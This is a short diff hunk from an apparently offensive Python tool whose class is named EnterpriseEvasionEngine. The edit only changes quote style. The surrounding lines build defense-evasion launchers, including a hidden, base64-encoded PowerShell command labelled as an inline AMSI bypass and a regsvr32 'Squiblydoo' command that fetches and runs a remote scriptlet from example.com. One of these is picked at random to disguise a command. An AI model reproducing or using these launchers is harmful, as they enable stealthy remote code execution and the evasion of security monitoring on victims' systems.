@@ -513,7 +513,7 @@ class EnterpriseEvasionEngine:
             # powershell with AMSI bypass inline
             lambda c: f'powershell -nop -w hidden -e {base64.b64encode(c.encode("utf-16-le")).decode()}',
             # regsvr32 scrobj.dll (Squiblydoo technique)
-            lambda c: f'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll',
+            lambda c: f"regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll",
         ]
         choice = random.choice(lolbins)
         return choice(command)
